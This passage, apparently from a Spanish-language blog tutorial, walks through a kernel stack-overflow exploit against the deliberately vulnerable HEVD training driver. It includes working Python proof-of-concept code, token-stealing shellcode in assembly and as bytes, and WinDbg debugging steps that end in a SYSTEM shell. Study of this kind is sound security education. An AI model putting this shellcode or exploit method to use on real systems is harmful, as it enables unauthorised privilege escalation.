</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>Una vez enviado, podemos ver que hemos sobrescrito una dirección que utiliza la computadora para regresar y hemos ganado control sobre el puntero de instrucción (EIP).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eip_7.png" alt="alt text"></p>
<h2 id="kernel-shellcode">Kernel Shellcode??</h2>
<p>Entonces tenemos control sobre el puntero de las instrucciones, y tenemos un conocimiento sólido de cómo. Una pregunta falta, ¿cómo podemos manipular código para ejecutar? Es mas, cómo podemos crear un &ldquo;shell&rdquo; de &ldquo;SYSTEM&rdquo;?</p>
<p>Vamos a necesitar shellcode, sin embargo, no podemos usar cualquier shellcode. Como estamos corriendo bajo el contexto de el Kernel, un paso equivocado resulta en una pantalla de muerte azul (BSOD). Para alcanzar nuestro objetivo, utilizaremos una técnica conocida como <strong>Token Stealing</strong>. Usando esta técnica, copiaremos un token con privilegios a nuestro proceso.</p>
<p>Por suerte para nosotros, HEVD viene con copias de Payloads incluyendo este. Echemos una mirada a <em>Payloads.c</em> dentro del repositro.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">186</span> VOID <span style="color:#a6e22e">TokenStealingPayloadWin7Generic</span>() {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>     <span style="color:#75715e">// No Need of Kernel Recovery as we are not corrupting anything
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">188</span>     <span style="color:#66d9ef">__asm</span> {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">189</span>         pushad                               ; Save registers state
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">190</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span>         ; Start of Token Stealing Stub       
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>         xor eax, eax                         ; Set ZERO
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span>         mov eax, fs:[eax <span style="color:#f92672">+</span> KTHREAD_OFFSET]   ; Get nt<span style="color:#f92672">!</span>_KPCR.PcrbData.CurrentThread
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span>                                              ; _KTHREAD is located at FS:[<span style="color:#ae81ff">0x124</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">196</span>         mov eax, [eax <span style="color:#f92672">+</span> EPROCESS_OFFSET]     ; Get nt<span style="color:#f92672">!</span>_KTHREAD.ApcState.Process
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">197</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">198</span>         mov ecx, eax                         ; Copy current process _EPROCESS structure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         mov edx, SYSTEM_PID                  ; WIN <span style="color:#ae81ff">7</span> SP1 SYSTEM process PID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span>         SearchSystemPID:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>             mov eax, [eax <span style="color:#f92672">+</span> FLINK_OFFSET]    ; Get nt<span style="color:#f92672">!</span>_EPROCESS.ActiveProcessLinks.Flink
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>             sub eax, FLINK_OFFSET
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>             cmp [eax <span style="color:#f92672">+</span> PID_OFFSET], edx      ; Get nt<span style="color:#f92672">!</span>_EPROCESS.UniqueProcessId
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>             jne SearchSystemPID
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>         mov edx, [eax <span style="color:#f92672">+</span> TOKEN_OFFSET]        ; Get SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span>         mov [ecx <span style="color:#f92672">+</span> TOKEN_OFFSET], edx        ; Replace target process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">210</span>                                              ; with SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">211</span>         ; End of Token Stealing Stub
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">212</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>         popad                                ; Restore registers state
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">214</span>     }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">215</span> }
</span></span></code></pre></div><p>Vamos a dividir esto línea por línea. En línea <em>192</em> borramos el registro EAX. Después, en línea <em>193</em> usamos el registro <em>FS</em> para obtener la dirección del &ldquo;current thread&rdquo; ubicado desde la distancia 0x124. Podemos ver esto con WinDbg:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/thread_7.png" alt="alt text"></p>
<p>Vamos a mapear la estructura, primero necesitamos la dirección del el <em>PCR (Processor Control Region)</em>, también conocido como el <em>_KPCR</em> desde allí podemos fácilmente iterar sobre la estructura y encontrar el &ldquo;current thread&rdquo;.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/map_7.png" alt="alt text"></p>
<p>Después, necesitamos encontrar la dirección de la estructura <em>_EPROCESS (&ldquo;Executive Process&rdquo;)</em>.</p>
<p>Cada proceso en ejecución en un los systemas de Windows esta asociado con un estructura de EPROCESS. Podemos hacer esto tal como hicimos el _KCPR.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocess_7.png" alt="alt text"></p>
<p>Ahora veamos el siguiente bloque de código dentro de este &ldquo;payload&rdquo; (aqi siéntete libre de nomas leer porque en este punto comencé a escribir el código para Sickle):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         SearchSystemPID:
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">FLINK_OFFSET</span>]    <span style="color:#75715e">; Get nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">FLINK_OFFSET</span>
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">PID_OFFSET</span>], <span style="color:#66d9ef">edx</span>      <span style="color:#75715e">; Get nt!_EPROCESS.UniqueProcessId
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
</span></span></code></pre></div><p>Aquí estamos extractado el puntero al <em>forward link (FLINK) pointer</em> desde el *_EPROCESS&quot; corriente, luego restando la distancia al FLINK desde EAX para cambiar EAX para señalar el siguiente estructura _EPROCESS dentro del lista enlazada. Luego comparamos la identificación del proceso de la estructura _EPROCESS a 0x04 y si no se encuentra seguimos buscando hasta que encontramos el proceso de &ldquo;SYSTEM&rdquo;.</p>
<p>Una vez que encontramos el proceso, simplemente reemplazamos nuestro token del proceso &ldquo;SYSTEM&rdquo;. Esto es casi como un cazador de huevos (&ldquo;egghunter&rdquo;) pero para los tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>]        <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>], <span style="color:#66d9ef">edx</span>        <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                              <span style="color:#75715e">; with SYSTEM process nt!_EPROCESS.Token
</span></span></span></code></pre></div><p>El código se puede ver aqi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">32</span>      ]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">SECTION</span> <span style="color:#66d9ef">.text</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pushad</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; set ZERO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x124</span>]     <span style="color:#75715e">; nt!_KPCR.PcrbData.CurrentThread
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x50</span>]             <span style="color:#75715e">; nt!_KTHREAD.ApcState.Process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; Copy current process _EPROCESS structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x04</span>                     <span style="color:#75715e">; WIN 10 SYSTEM PROCESS PID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        SearchSystemPID:
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb8</span>]         <span style="color:#75715e">; nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xb8</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb4</span>], <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; nt!_EPROCESS.UniqueProcessId
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>]             <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>], <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">popad</span>
</span></span></code></pre></div><p>Veamos esto en el depurador (debugger), puedes generarlo usando <em>Sickle</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61&#39;</span>
</span></span></code></pre></div><p>Realizar los cambios en el PoC como se demuestra aqi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ           <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>MEM_COMMIT             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001000</span>
</span></span><span style="display:flex;"><span>MEM_RESERVE            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00002000</span>
</span></span><span style="display:flex;"><span>PAGE_EXECUTE_READWRITE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000040</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">=</span> bytearray()
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00\x61</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Allocating RWX memory&#34;</span>)
</span></span><span style="display:flex;"><span>  ptrMemory <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>VirtualAlloc(NULL,
</span></span><span style="display:flex;"><span>                                    len(shellcode),
</span></span><span style="display:flex;"><span>                                    (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                                    PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Creating a char array to house shellcode&#34;</span>)
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> (c_char <span style="color:#f92672">*</span> len(shellcode))<span style="color:#f92672">.</span>from_buffer(shellcode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Copying shellcode array into RWX memory&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ptrShellcode <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, ptrMemory)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2080</span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">+=</span> ptrShellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>Como vamos a sobrescribir una dirección de regreso, hacer una pausa en <strong>BASE+DISTANCIA</strong>. Podemos obtener esto con Ghidra.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/ret_7.png" alt="alt text"></p>
<p>Aplicar esto a WinDbg.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/offset-ret_7.png" alt="alt text"></p>
<p>Con una pausa configurada, inicie el exploit a el &ldquo;target machine&rdquo;.</p>
<p>Una vez que llegues a la pausa, podemos ver que estamos a punto de regresar a la región de memoria y ejecutar nuestro código / shellcode (52 &ldquo;bytes&rdquo;).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bp1_7.png" alt="alt text"></p>
<p>Entremos en esto (<em>t</em>) hasta que la veamos <strong>mov edx, 0x04</strong>. Aqi <em>ECX</em> y <em>EAX</em> debe contener direcciones a <em>_EPROCESS</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocEAX.png" alt="alt text"></p>
<p>La siguiente instrucción mueve el FLINK a dentro de EAX.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/flink_ptr_7.png" alt="alt text"></p>
<p>Una vez ejecutado, <strong>sub eax, 0xb8</strong> se ejecuta (como estamos atravesando procesos activos).</p>
<p>Esto efectivamente posiciona EAX a el comienzo de la proxima estructura _EPROCESS.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/next_eproc_7.png" alt="alt text"></p>
<p>Establezcamos un punto de interrupción aqi y ate continuar la ejecución hasta el proceso <em>_EPROCESS.UniqueProcessId</em> es 0x04. Una vez encontrado podemos ver que el salto no se ejecutará!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/npjmp.png" alt="alt text"></p>
<p>Ahora el código simplemente copia el token en nuestra estructura _EPROCESS! Parece que estaba equivocada en el último par de notas esto se puede encontrar en el proceso de propiedad.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/owning_7.png" alt="alt text"></p>
<p>Entonces la realidad es que no tenemos que mirar demasiado lejos una vez que tenemos el &ldquo;current thread&hellip;&rdquo; Estaba confundido pero ahora tiene sentido. Puedes ver esto aqi:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/recap_7.png" alt="alt text"></p>
<p>Ahora podemos continuar ejecutando nuestro shellcode, pero nos estrellamos, ¿por qué?</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/crash_7.png" alt="alt text"></p>
<h2 id="arreglando-el-choque">Arreglando el Choque</h2>
<p>Mirando el estado de los registros aparece que EBP todavía está corrupto. Sin embargo, lo más importante es que nunca regresaremos. Agreguemos una instrucción &ldquo;ret&rdquo; a el shellcode y poner una dirección válida sobre EBP y intentar otra vez.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -a x86 -m asm_shell -f c                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ASM Shell loaded <span style="color:#66d9ef">for</span> x86 architecture
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sickle &gt; a pop ebp
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5d&#34;</span> // pop ebp
</span></span><span style="display:flex;"><span>sickle &gt; a ret
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc3&#34;</span> // ret
</span></span></code></pre></div><p>Una vez que cambiamos el PoC y lo enviamos, todavía chocamos. Así que decidí mirar Ghidra, y puedes ver que la instrucción &ldquo;ret&rdquo; en realidad es <em>RET 0x8</em>. Vamos intentar de nuevo&hellip;</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/lr_7.png" alt="alt text"></p>
<p>Una vez que lo enviemos, somos &ldquo;SYSTEM&rdquo;!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/poc.gif" alt="alt text"></p>
<h1 id="recursos">Recursos</h1>
<pre tabindex="0"><code>https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/
https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr
https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md
https://youtu.be/Ca3dAXDdoz8?si=oN_DsgyLz-Z4fVYL
</code></pre>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
